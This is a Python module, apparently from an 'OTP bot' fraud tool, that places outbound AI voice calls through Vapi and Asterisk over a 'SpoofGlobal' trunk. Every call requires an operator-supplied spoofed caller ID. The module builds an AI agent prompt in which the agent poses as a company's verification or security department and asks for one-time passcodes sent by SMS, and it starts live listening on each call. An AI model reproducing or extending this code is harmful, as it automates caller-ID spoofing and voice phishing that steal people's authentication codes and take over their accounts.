"""
services/call_service.py

Outbound call placement for the pure Vapi + Asterisk path.

Every call is placed through Vapi's SIP phone number resource
(VAPI_SIP_PHONE_NUMBER_ID): Vapi INVITEs Asterisk, Asterisk reads the per-call
caller-ID file (services/asterisk_service.py) and dials the target out through
the SpoofGlobal trunk. The only identifier used for tracking, status, and
termination is the Vapi call UUID returned by ``create_call``.
"""

import json
import logging
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from typing import Optional

from config import VAPI_SIP_PHONE_NUMBER_ID, ASTERISK_DEFAULT_CALLER_ID
from core.files import ensure_user_path, user_conf_path, write_user_file
from services.asterisk_service import remove_asterisk_cli_file, write_asterisk_cli_file

logger = logging.getLogger(__name__)


class CallerIdRequiredError(Exception):
    """Raised when a call request arrives without an operator-provided caller ID.

    In the Asterisk/SpoofGlobal path the caller ID is mandatory — there is no
    platform default and no number pool to fall back on.
    """


_call_executor = ThreadPoolExecutor(
    max_workers=4,
    thread_name_prefix="vapi-call",
)


def place_ai_call(
    to: str,
    user_id: str,
    chat_id: Optional[int],
    customer_name: str,
    assistant_overrides: dict,
    metadata: dict,
    from_number: str = None,
    caller_id: str = None,
    record: bool = True,
    endpoint: str = "/call",
    mode_label: str = "AI Call",
    **session_kwargs,
):
    """Place an outbound AI call through Vapi SIP -> Asterisk -> SpoofGlobal.

    The caller ID (spoofed CLI) must be supplied by the operator. It is written
    to the per-call CLI file BEFORE the Vapi call is created so Asterisk's AGI
    always finds it. Returns the Vapi call UUID (the only call identifier) or
    None on failure. Raises :class:`CallerIdRequiredError` when no caller ID is
    given.
    """
    from services.vapi_service import create_call

    cli_number = str(caller_id or from_number or "").strip()
    if not cli_number:
        raise CallerIdRequiredError(
            "Caller ID is mandatory. Provide a caller ID number (E.164) for this call."
        )
    if "YOUR_" in cli_number or "1234567890" in cli_number:
        raise CallerIdRequiredError(
            "Invalid caller ID (placeholder). Provide a real E.164 caller ID."
        )

    display_name = session_kwargs.get("from_name") or customer_name or "OTP Bot"
    write_asterisk_cli_file(to, cli_number, display_name)

    try:
        vapi_call_id = create_call(
            customer_number=to,
            customer_name=customer_name,
            assistant_overrides=assistant_overrides,
            metadata=metadata,
            phone_number_id=VAPI_SIP_PHONE_NUMBER_ID or None,
        )
        if not vapi_call_id:
            logger.error("[CALL_PLACE] Vapi SIP call failed for %s (user=%s)", to, user_id)
            remove_asterisk_cli_file(to)
            return None

        logger.info("[CALL_PLACE] Call placed via Vapi SIP vapi_call=%s target=%s (user=%s)",
                    vapi_call_id, to, user_id)
        store_call_metadata(user_id, vapi_call_id, target=to)
        try:
            from bot import register_call_session
            register_call_session(
                vapi_call_id,
                user_id,
                chat_id=chat_id,
                endpoint=endpoint,
                mode_label=mode_label,
                vapi_call_id=vapi_call_id,
                **session_kwargs,
            )
        except Exception as exc:
            logger.debug("Failed to register vapi session: %s", exc)
        try:
            from bot import _notify_live_listen_start
            _notify_live_listen_start(vapi_call_id, chat_id=chat_id, user_id=user_id)
        except Exception as exc:
            logger.debug("Failed to bootstrap live listen session: %s", exc)
        return vapi_call_id
    except CallerIdRequiredError:
        raise
    except Exception as exc:
        logger.error("[CALL_PLACE] unexpected error for %s (user=%s): %s", to, user_id, exc)
        remove_asterisk_cli_file(to)
        return None


def make_call(to: str, from_number: str = None, caller_id: str = None,
              webhook_url: str = None, user_id: str = "",
              record: bool = True,
              **kwargs) -> Optional[str]:
    """Build call metadata from user settings and place the call via Vapi."""
    from models.call_metadata import CallMetadata, TargetInfo, CompanyInfo, OTPConfig, AIBehavior
    from services.prompt_builder import PromptBuilder
    from services.voice_identity import select_agent_name
    from core.files import read_user_file

    name = kwargs.get("name") or read_user_file(user_id, "Name.txt", "Customer")
    company = kwargs.get("company") or read_user_file(user_id, "Company Name.txt", "Verification Department")
    department = kwargs.get("department") or read_user_file(user_id, "Department.txt", "Security")
    reason = kwargs.get("reason") or read_user_file(user_id, "Reason.txt", "verify your recent activity and confirm your identity")
    chat_id = kwargs.get("chat_id")
    code_length_str = kwargs.get("code_length") or read_user_file(user_id, "CodeLength.txt", "6")
    code_length = int(code_length_str)
    delivery_method = kwargs.get("delivery_method") or read_user_file(user_id, "Delivery.txt", "sms")
    voice_provider = kwargs.get("voice_provider") or read_user_file(user_id, "VoiceProvider.txt", "vapi")
    voice_id = kwargs.get("voice_id") or read_user_file(user_id, "Voice.txt", "")
    emotion = kwargs.get("emotion") or read_user_file(user_id, "emotion.txt", "neutral")
    language = kwargs.get("language") or read_user_file(user_id, "Language.txt", "en")
    speaking_style = kwargs.get("speaking_style") or read_user_file(user_id, "SpeakingStyle.txt", "") or None
    speech_speed = float(kwargs.get("speech_speed") or read_user_file(user_id, "SpeechSpeed.txt", "1.0"))

    customer_name = name
    agent_name = select_agent_name(voice_id)

    metadata = CallMetadata(
        target=TargetInfo(name=name, phone=to, customer_type="customer"),
        company=CompanyInfo(name=company, department=department, representative_name=agent_name),
        reason=reason,
        otp=OTPConfig(length=code_length, delivery_method=delivery_method),
        ai=AIBehavior(
            voice_provider=voice_provider,
            voice_id=voice_id,
            language=language,
            emotion=emotion,
            speaking_style=speaking_style,
            speech_speed=speech_speed,
        ),
    )
    custom_instructions = kwargs.get("custom_instructions") or read_user_file(user_id, "custom_script.txt", "") or None
    if custom_instructions:
        metadata.custom_instructions = custom_instructions
    else:
        override = read_user_file(user_id, "ai_prompt_override.txt", "").strip()
        if override:
            metadata.custom_instructions = override
    metadata.internal = {
        "user_id": user_id,
        "chat_id": chat_id,
        "code_length": code_length,
    }

    builder = PromptBuilder()
    system_prompt = builder.build(metadata)
    assistant_overrides = metadata.to_vapi_assistant_overrides()
    assistant_overrides["model"]["messages"] = [
        {"role": "system", "content": system_prompt},
    ]

    call_metadata = {
        "user_id": user_id,
        "chat_id": str(chat_id) if chat_id else "",
        "code_length": str(code_length),
    }

    return place_ai_call(
        to=to,
        user_id=user_id,
        chat_id=chat_id,
        customer_name=customer_name,
        assistant_overrides=assistant_overrides,
        metadata=call_metadata,
        from_number=from_number,
        caller_id=caller_id,
        record=record,
        endpoint=kwargs.get("endpoint") or "/call",
        mode_label=kwargs.get("mode_label") or "AI Call",
        voice_id=voice_id,
        emotion=emotion,
        name=name,
        company=company,
        language=language,
        code_length=str(code_length),
        delivery_method=delivery_method,
    )


def make_call_and_store_async(
    user_id: str,
    to: str,
    from_number: str = None,
    caller_id: str = None,
    webhook_url: str = None,
    record: bool = True,
    target: str = "",
    **kwargs,
):
    """Launch a Vapi call and persist metadata in the background."""

    def _run() -> Optional[str]:
        return make_call(
            to=to,
            from_number=from_number,
            caller_id=caller_id,
            webhook_url=webhook_url,
            user_id=user_id,
            record=record,
            **kwargs,
        )

    try:
        return _call_executor.submit(_run)
    except Exception as exc:
        logger.error("Vapi call + metadata dispatch failed: %s", exc, exc_info=True)
        return None


def get_call_status(call_id: str) -> Optional[str]:
    """Return the call status via Vapi's REST API (GET /call/{id})."""
    from services.vapi_service import get_call as vapi_get_call
    if not call_id:
        return None
    call_data = vapi_get_call(call_id)
    if call_data:
        return call_data.get("status")
    return None


def store_call_metadata(user_id: str, sid: str, target: str = "") -> None:
    """Store call id in user's metadata (for live listen)."""
    ensure_user_path(user_id)
    write_user_file(user_id, "call_sid.txt", sid)
    history_path = user_conf_path(user_id) / "call_history.json"
    history = []
    if history_path.exists():
        try:
            with open(history_path, "r", encoding='utf-8') as f:
                history = json.load(f)
        except Exception:
            history = []
    history.append({
        "sid": sid,
        "target": target,
        "started": datetime.now().isoformat(),
        "status": "initiated"
    })
    with open(history_path, "w", encoding='utf-8') as f:
        json.dump(history, f, indent=2)